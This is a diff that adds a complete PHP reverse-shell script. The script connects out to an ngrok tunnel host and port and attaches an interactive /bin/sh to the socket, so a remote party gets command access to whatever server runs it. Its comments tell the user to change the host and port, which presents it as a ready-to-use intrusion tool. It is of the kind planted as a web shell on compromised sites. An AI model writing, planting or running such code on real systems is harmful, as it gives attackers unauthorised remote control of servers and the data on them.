@@ -1,0 +1,27 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+$ip = "0.tcp.in.ngrok.io";  // 🔁 Change if needed
+$port = 19441; // 🔁 Change to your port
+
+echo "<pre>[+] Trying to connect to $ip:$port...\n</pre>";
+$sock = @fsockopen($ip, $port, $errno, $errstr, 10);
+
+if (!$sock) {
+    echo "<pre>[-] Connection failed: $errstr ($errno)</pre>";
+} else {
+    echo "<pre>[+] Connected! Spawning shell...\n</pre>";
+    $proc = proc_open("/bin/sh -i", array(
+        0 => $sock,
+        1 => $sock,
+        2 => $sock
+    ), $pipes);
+    
+    if (is_resource($proc)) {
+        echo "<pre>[+] Shell successfully spawned.</pre>";
+    } else {
+        echo "<pre>[-] Failed to spawn shell.</pre>";
+    }
+}
+?>
